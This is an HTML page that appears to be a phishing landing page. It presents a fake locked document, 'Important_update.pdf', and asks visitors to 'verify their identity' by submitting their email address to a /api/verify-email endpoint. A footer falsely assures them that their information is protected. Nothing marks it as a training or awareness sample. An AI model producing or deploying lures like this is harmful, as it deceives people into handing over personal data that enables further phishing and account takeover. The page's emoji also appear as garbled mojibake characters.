<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Verify Your Identity</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <style>
    body {
      margin: 0;
      background: #f3f3f3;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #111;
    }

    .page {
      width: 100%;
      max-width: 460px;
      padding: 24px;
    }

    .card {
      background: #fff;
      border-radius: 6px;
      box-shadow: 0 1px 3px rgba(0,0,0,.12);
      padding: 28px;
    }

    .doc-row {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 14px;
      margin-bottom: 28px;
    }

    .doc-icon {
      width: 18px;
      height: 22px;
      border: 1px solid #ccc;
      border-radius: 2px;
      position: relative;
    }

    .doc-icon::after {
      content: "+";
      position: absolute;
      right: -6px;
      bottom: -6px;
      width: 14px;
      height: 14px;
      background: #d32f2f;
      color: #fff;
      font-size: 11px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .lock {
      width: 48px;
      height: 48px;
      border-radius: 50%;
      border: 2px solid #1a73e8;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #1a73e8;
      font-size: 22px;
      margin: 0 auto 16px;
    }

    h1 {
      font-size: 22px;
      text-align: center;
      margin-bottom: 10px;
    }

    .subtitle {
      font-size: 14px;
      color: #555;
      text-align: center;
      margin-bottom: 22px;
    }

    label {
      font-size: 13px;
      color: #333;
      display: block;
      margin-bottom: 6px;
    }

    .input-wrap {
      position: relative;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px 12px 12px 40px;
      font-size: 14px;
      border: 1px solid #c7c7c7;
      border-radius: 4px;
    }

    .input-wrap span {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 16px;
      color: #777;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #1a73e8;
      border: none;
      border-radius: 999px;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    button:hover {
      background: #1558b0;
    }

    .security {
      margin-top: 22px;
      font-size: 12px;
      color: #666;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }

    .security span {
      color: #1e8e3e;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <div class="page">
    <div class="card">

      <!-- Document row -->
      <div class="doc-row">
        <div class="doc-icon"></div>
        <strong>Important_update.pdf</strong>
      </div>

      <!-- Lock icon -->
      <div class="lock">üîí</div>

      <h1>Verify your identity</h1>
      <div class="subtitle">
        To access this document, please confirm your email address.
      </div>

      <form action="/api/verify-email" method="POST">
        <label>Email address</label>

        <div class="input-wrap">
          <span>‚úâÔ∏è</span>
          <input
            type="email"
            name="email"
            placeholder="Enter your email address"
            required
          />
        </div>

        <button type="submit">Continue</button>
      </form>

      <div class="security">
        <span>‚úî</span>
        Your information is protected with secure verification
      </div>

    </div>
  </div>

</body>
</html>
